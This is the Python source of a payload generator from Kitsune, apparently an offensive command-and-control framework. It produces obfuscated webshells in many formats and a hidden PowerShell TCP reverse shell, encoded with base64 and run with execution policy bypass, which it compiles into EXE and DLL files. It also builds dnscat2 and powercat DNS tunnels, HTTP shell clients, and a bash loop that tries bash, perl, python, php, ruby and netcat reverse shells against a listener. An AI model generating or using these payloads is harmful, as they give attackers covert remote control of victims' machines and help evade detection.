#!/usr/bin/python3
#=========================#
#  Kitsune by @JoelGMSec  #
#      darkbyte.net       #
#=========================#

import os
import base64
import shutil
from modules import compiler, custom, obfuscator, dialog

def generate_webshell(app, tail, format, obfuscate):
    if tail and format and obfuscate:
        payloads_dir = "payloads"
        os.makedirs(payloads_dir, exist_ok=True)

        if format == "Asp":
            src_file = "tails/PyShell/Shells/shell.asp"
            dst_file = os.path.join(payloads_dir, "webshell.asp")
            shutil.copy(src_file, dst_file)

            if obfuscate == "Yes":
                with open(dst_file, 'r') as file:
                    code = file.read()
                obfuscated_code = obfuscator.obfuscate_asp(code)
                with open(dst_file, 'w') as file:
                    file.write(obfuscated_code)

        if format == "Aspx":
            src_file = "tails/PyShell/Shells/shell.aspx"
            dst_file = os.path.join(payloads_dir, "webshell.aspx")
            shutil.copy(src_file, dst_file)

            if obfuscate == "Yes":
                with open(dst_file, 'r') as file:
                    code = file.read()
                obfuscated_code = obfuscator.obfuscate_aspx(code)
                with open(dst_file, 'w') as file:
                    file.write(obfuscated_code)

        if format == "Jsp":
            src_file = "tails/PyShell/Shells/shell.jsp"
            dst_file = os.path.join(payloads_dir, "webshell.jsp")
            shutil.copy(src_file, dst_file)

            if obfuscate == "Yes":
                with open(dst_file, 'r') as file:
                    code = file.read()
                obfuscated_code = obfuscator.obfuscate_jsp(code)
                with open(dst_file, 'w') as file:
                    file.write(obfuscated_code)
        
        if format == "Php":
            src_file = "tails/PyShell/Shells/shell.php"
            dst_file = os.path.join(payloads_dir, "webshell.php")
            shutil.copy(src_file, dst_file)

            if obfuscate == "Yes":
                with open(dst_file, 'r') as file:
                    code = file.read()
                obfuscated_code = obfuscator.obfuscate_php(code)
                with open(dst_file, 'w') as file:
                    file.write(obfuscated_code)

        if format == "Python 3":
            src_file = "tails/PyShell/Shells/shell.py"
            dst_file = os.path.join(payloads_dir, "webshell.py")
            shutil.copy(src_file, dst_file)

            if obfuscate == "Yes":
                with open(dst_file, 'r') as file:
                    code = file.read()
                obfuscated_code = obfuscator.obfuscate_py3(code)
                with open(dst_file, 'w') as file:
                    file.write(obfuscated_code)

        if format == "Shell":
            src_file = "tails/PyShell/Shells/shell.sh"
            dst_file = os.path.join(payloads_dir, "webshell.sh")
            shutil.copy(src_file, dst_file)

            if obfuscate == "Yes":
                with open(dst_file, 'r') as file:
                    code = file.read()
                obfuscated_code = obfuscator.obfuscate_sh(code)
                with open(dst_file, 'w') as file:
                    file.write(obfuscated_code)

        if format == "Tomcat":
            src_file = "tails/PyShell/Shells/tomcat.war"
            dst_file = os.path.join(payloads_dir, "tomcat.war")
            shutil.copy(src_file, dst_file)

        if format == "Wordpress":
            src_file = "tails/PyShell/Shells/wordpress.zip"
            dst_file = os.path.join(payloads_dir, "wordpress.zip")
            shutil.copy(src_file, dst_file)

        dialog.generate_success(app)
        obfuscate = False

def generate_payload(app, tail, file_format, listener_name):
    if tail and file_format and listener_name:
        payloads_dir = "payloads"
        os.makedirs(payloads_dir, exist_ok=True)

        listener_host = ""
        listener_port = ""

        for listener in app.listeners:
            if listener["Name"] == listener_name:  
                listener_host = listener["Host"]
                listener_port = listener["Port"]
                break

        if tail == "Villain":
            if file_format == "Ps1":
                dst_name = "Villain_" + str(listener_port) + ".ps1"
                dst_file = os.path.join(payloads_dir, dst_name.lower())
                
                content = '''Start-Process powershell.exe -ArgumentList {while ($true){$TCPClient = New-Object Net.Sockets.TCPClient('*LHOST*', *LPORT*);$NetworkStream = $TCPClient.GetStream();$StreamWriter = New-Object IO.StreamWriter($NetworkStream);function WriteToStream ($String) {[byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {0};$StreamWriter.Write($String);$StreamWriter.Flush()}WriteToStream '';while(($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);$Output = try {Invoke-Expression $Command 2>&1 | Out-String} catch {$_ | Out-String}WriteToStream ($Output)}$StreamWriter.Close()}} -WindowStyle Hidden'''
                content = content.replace("*LHOST*", str(listener_host))
                content = content.replace("*LPORT*", str(listener_port))
                content = "powershell -ep bypass -e " + base64.b64encode(content.encode('utf16')[2:]).decode()

                with open(dst_file, 'w') as file:
                    file.writelines(content)
                custom.exec_custom_modules(app, "generate", dst_file, file_format)

            if file_format == "Exe":
                dst_name = "Villain_" + str(listener_port)
                dst_file = os.path.join(payloads_dir, dst_name.lower())
                
                content = '''Start-Process powershell.exe -ArgumentList {while ($true){$TCPClient = New-Object Net.Sockets.TCPClient('*LHOST*', *LPORT*);$NetworkStream = $TCPClient.GetStream();$StreamWriter = New-Object IO.StreamWriter($NetworkStream);function WriteToStream ($String) {[byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {0};$StreamWriter.Write($String);$StreamWriter.Flush()}WriteToStream '';while(($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);$Output = try {Invoke-Expression $Command 2>&1 | Out-String} catch {$_ | Out-String}WriteToStream ($Output)}$StreamWriter.Close()}} -WindowStyle Hidden'''
                content = content.replace("*LHOST*", str(listener_host))
                content = content.replace("*LPORT*", str(listener_port))
                content = base64.b64encode(content.encode('utf16')[2:]).decode()
                compiler.create_c_file(content, dst_file, "exe")
                compiler.compile_exe_file(dst_file)
                custom.exec_custom_modules(app, "generate", dst_file, file_format)

            if file_format == "Dll":
                dst_name = "Villain_" + str(listener_port)
                dst_file = os.path.join(payloads_dir, dst_name.lower())
                
                content = '''Start-Process powershell.exe -ArgumentList {while ($true){$TCPClient = New-Object Net.Sockets.TCPClient('*LHOST*', *LPORT*);$NetworkStream = $TCPClient.GetStream();$StreamWriter = New-Object IO.StreamWriter($NetworkStream);function WriteToStream ($String) {[byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {0};$StreamWriter.Write($String);$StreamWriter.Flush()}WriteToStream '';while(($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);$Output = try {Invoke-Expression $Command 2>&1 | Out-String} catch {$_ | Out-String}WriteToStream ($Output)}$StreamWriter.Close()}} -WindowStyle Hidden'''
                content = content.replace("*LHOST*", str(listener_host))
                content = content.replace("*LPORT*", str(listener_port))
                content = base64.b64encode(content.encode('utf16')[2:]).decode()
                compiler.create_c_file(content, dst_file, "dll")
                compiler.compile_dll_file(dst_file)

        if tail == "DnsCat2":
            if file_format == "Bash":
                src_file = "tails/dnscat2/client/dnscat"
                dst_name = "DnsCat2_" + str(listener_port) + ".sh"
                dst_file = os.path.join(payloads_dir, dst_name.lower())        

                with open(src_file, 'rb') as file:
                    content = file.read()

                payload = base64.b64encode(content).decode('utf-8')
                content = (f"echo '{payload}' | base64 -di > /tmp/dnscat2 ; chmod +x /tmp/dnscat2 ; /tmp/dnscat2 --dns 'server={listener_host},port={listener_port},domain=kit.su.ne'")
                
                with open(dst_file, 'w') as file:
                    file.writelines(content)

            if file_format == "Binary":
                src_file = "tails/dnscat2/client/dnscat"
                dst_name = "DnsCat2_" + str(listener_port)
                dst_file = os.path.join(payloads_dir, dst_name.lower())        

                with open(src_file, 'rb') as file:
                    content = file.read()
                
                payload = base64.b64encode(content).decode('utf-8')
                content = (f"echo '{payload}' | base64 -di > /tmp/dnscat2 ; chmod +x /tmp/dnscat2 ; /tmp/dnscat2 --dns 'server={listener_host},port={listener_port},domain=kit.su.ne'")
                compiler.create_c_file(content, dst_file, "bin")
                compiler.compile_bin_file(dst_file)

            if file_format == "Python 3":
                src_file = "tails/dnscat2/client/dnscat"
                dst_name = "DnsCat2_" + str(listener_port) + ".py"
                dst_file = os.path.join(payloads_dir, dst_name.lower())        

                with open(src_file, 'rb') as file:
                    content = file.read()
                
                payload = base64.b64encode(content).decode('utf-8')
                content = (f"echo '{payload}' | base64 -di > /tmp/dnscat2 ; chmod +x /tmp/dnscat2 ; /tmp/dnscat2 --dns 'server={listener_host},port={listener_port},domain=kit.su.ne'")
                compiler.create_py_file(content, dst_file)

            if file_format == "Ps1":
                src_file = "tails/dnscat2/client/win32/powercat/powercat.ps1"
                dst_name = "DnsCat2_" + str(listener_port) + ".ps1"
                dst_file = os.path.join(payloads_dir, dst_name.lower())
                
                with open(src_file, 'r') as file:
                    content = file.readlines()
                
                content.append(f"\nwhile ($true) {{ powercat -c {listener_host} -p {listener_port} -dns kit.su.ne -e powershell }} \n")
                
                with open(dst_file, 'w') as file:
                    file.writelines(content)
                custom.exec_custom_modules(app, "generate", dst_file, file_format)                    

            if file_format == "Exe":
                src_file = "tails/dnscat2/client/win32/powercat/powercat.ps1"
                dst_name = "DnsCat2_" + str(listener_port)
                dst_file = os.path.join(payloads_dir, dst_name.lower())
                
                with open(src_file, 'r') as file:
                    content = file.readlines()
                
                content.append(f"\npowercat -c {listener_host} -p {listener_port} -dns kit.su.ne -e powershell\n")
                content = " ".join(content)
                content = base64.b64encode(content.encode('utf16')[2:]).decode()
                compiler.create_c_file(content, dst_file, "exe")
                compiler.compile_exe_file(dst_file)
                custom.exec_custom_modules(app, "generate", dst_file, file_format)

            if file_format == "Dll":
                src_file = "tails/dnscat2/client/win32/powercat/powercat.ps1"
                dst_name = "DnsCat2_" + str(listener_port)
                dst_file = os.path.join(payloads_dir, dst_name.lower())
                
                with open(src_file, 'r') as file:
                    content = file.readlines()
                
                content.append(f"\npowercat -c {listener_host} -p {listener_port} -dns kit.su.ne -e powershell\n")
                content = " ".join(content)
                content = base64.b64encode(content.encode('utf16')[2:]).decode()
                compiler.create_c_file(content, dst_file, "exe")
                compiler.compile_dll_file(dst_file)

        elif tail == "HTTP-Shell":
            if file_format == "Bash":
                src_file = "tails/HTTP-Shell/HTTP-Client.sh"
                dst_name = "HTTP-Shell_" + str(listener_port) + ".sh"
                dst_file = os.path.join(payloads_dir, dst_name.lower())
                
                with open(src_file, 'r') as file:
                    content = file.readlines()
                
                content.insert(6, "HTTPShell() {\n\n")
                content.append(f"\n}}\n\nHTTPShell -c {listener_host}:{listener_port}\n")
                
                with open(dst_file, 'w') as file:
                    file.writelines(content)

            if file_format == "Binary":
                src_file = "tails/HTTP-Shell/HTTP-Client.sh"
                dst_name = "HTTP-Shell_" + str(listener_port)
                dst_file = os.path.join(payloads_dir, dst_name.lower())
                
                with open(src_file, 'r') as file:
                    content = file.readlines()
                
                content.insert(6, "HTTPShell() {\n\n")
                content.append(f"\n}}\n\nHTTPShell -c {listener_host}:{listener_port}\n")  
                payload = str(base64.b64encode(str(" ".join(content)).encode('utf8')).decode())
                content = "echo " + payload + " | base64 -di | bash"
                compiler.create_c_file(content, dst_file, "bin")
                compiler.compile_bin_file(dst_file)

            if file_format == "Python 3":
                src_file = "tails/HTTP-Shell/HTTP-Client.sh"
                dst_name = "HTTP-Shell_" + str(listener_port) + ".py"
                dst_file = os.path.join(payloads_dir, dst_name.lower())
                
                with open(src_file, 'r') as file:
                    content = file.readlines()
                
                content.insert(6, "HTTPShell() {\n\n")
                content.append(f"\n}}\n\nHTTPShell -c {listener_host}:{listener_port}\n")  
                payload = str(base64.b64encode(str(''.join(content)).encode('utf8')).decode())
                content = "echo " + payload + " | base64 -di | bash"
                compiler.create_py_file(content, dst_file)

            if file_format == "Ps1":
                src_file = "tails/HTTP-Shell/HTTP-Client.ps1"
                dst_name = "HTTP-Shell_" + str(listener_port) + ".ps1"
                dst_file = os.path.join(payloads_dir, dst_name.lower())
                
                with open(src_file, 'r') as file:
                    content = file.readlines()
                
                content.insert(0, "function HTTP-Shell {\n")
                content.append(f"\n}}\n\nHTTP-Shell -c {listener_host}:{listener_port}\n")
                
                with open(dst_file, 'w') as file:
                    file.writelines(content)
                custom.exec_custom_modules(app, "generate", dst_file, file_format)

            if file_format == "Exe":
                src_file = "tails/HTTP-Shell/HTTP-Client.ps1"
                dst_name = "HTTP-Shell_" + str(listener_port)
                dst_file = os.path.join(payloads_dir, dst_name.lower())
                
                with open(src_file, 'r') as file:
                    content = file.readlines()
                
                content.insert(0, "function HTTP-Shell {\n")
                content.append(f"\n}}\n\nHTTP-Shell -c {listener_host}:{listener_port}\n")
                content = " ".join(content)
                content = base64.b64encode(content.encode('utf16')[2:]).decode()
                compiler.create_c_file(content, dst_file, "exe")
                compiler.compile_exe_file(dst_file)
                custom.exec_custom_modules(app, "generate", dst_file, file_format)

            if file_format == "Dll":
                src_file = "tails/HTTP-Shell/HTTP-Client.ps1"
                dst_name = "HTTP-Shell_" + str(listener_port)
                dst_file = os.path.join(payloads_dir, dst_name.lower())
                
                with open(src_file, 'r') as file:
                    content = file.readlines()
                
                content.insert(0, "function HTTP-Shell {\n")
                content.append(f"\n}}\n\nHTTP-Shell -c {listener_host}:{listener_port}\n")
                content = " ".join(content)
                content = base64.b64encode(content.encode('utf16')[2:]).decode()
                compiler.create_c_file(content, dst_file, "dll")
                compiler.compile_dll_file(dst_file)

        elif tail == "PwnCat-CS":
            content = f"""#!/bin/bash

HOST={listener_host}
PORT={listener_port}

try_bash() {{
    /bin/bash -i >& /dev/tcp/$HOST/$PORT 0>&1
}}

try_perl() {{
    perl -e 'use Socket;$i="'"$HOST"'";$p='"$PORT"';socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");}};'
}}

try_python() {{
    python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("'"$HOST"'",'"$PORT"'));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
}}

try_php() {{
    php -r '$sock=fsockopen("'"$HOST"'",'"$PORT"');exec("/bin/sh -i <&3 >&3 2>&3");'
}}

try_ruby() {{
    ruby -rsocket -e'f=TCPSocket.open("'"$HOST"'",'"$PORT"'").to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
}}

try_nc() {{
    nc -e /bin/sh $HOST $PORT
}}

try_mkfifo_nc() {{
    rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $HOST $PORT >/tmp/f
}}

reversa_shells=(try_bash try_perl try_python try_php try_ruby try_nc try_mkfifo_nc)

while true; do
    for shell in "${{reversa_shells[@]}}"; do
        if command -v $shell &>/dev/null; then
            $shell
            if [ $? -eq 0 ]; then
                break
            else
                $null
            fi
        else
            $null
        fi
    done
done
"""
            if file_format == "Bash":
                dst_name = "PwnCat_" + str(listener_port) + ".sh"
                dst_file = os.path.join(payloads_dir, dst_name.lower())        
                with open(dst_file, 'w') as file:
                    file.write(content)

            if file_format == "Binary":
                dst_name = "PwnCat_" + str(listener_port)
                dst_file = os.path.join(payloads_dir, dst_name.lower())        
                payload = str(base64.b64encode(content.encode('utf8')).decode())
                content = "echo " + payload + " | base64 -di | bash"
                compiler.create_c_file(content, dst_file, "bin")
                compiler.compile_bin_file(dst_file)

            if file_format == "Python 3":
                dst_name = "PwnCat_" + str(listener_port) + ".py"
                dst_file = os.path.join(payloads_dir, dst_name.lower())        
                payload = str(base64.b64encode(content.encode('utf8')).decode())
                content = "echo " + payload + " | base64 -di | bash"
                compiler.create_py_file(content, dst_file)

        dialog.generate_success(app)
